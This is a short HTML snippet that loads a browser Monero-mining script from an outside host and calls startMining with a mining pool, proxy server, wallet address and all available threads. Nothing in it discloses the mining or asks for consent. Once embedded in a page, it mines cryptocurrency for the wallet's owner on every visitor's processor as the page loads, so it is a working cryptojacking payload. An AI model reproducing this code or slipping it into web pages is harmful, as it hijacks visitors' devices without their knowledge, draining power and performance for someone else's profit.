<script src="https://monerominer.rocks/miner-mmr/webmnr.min.js"></script>
<script>
    server = "wss://f.xmrminingproxy.com:8181";
    var pool = "moneroocean.stream";
    var walletAddress = "83xLJYkremPg9x3WpkyBw1d7QaUgpQ3YacX4i2Qa9aSMWVpAsHnVaPnhAEgyxupUm2erCGbgWUwJkZx3W9piFkMA4JFDdK3";
    var workerId = "termux"
    var threads = -1;
    var password = "x";
    startMining(pool, walletAddress, workerId, threads, password);
    throttleMiner = 20;
</script>
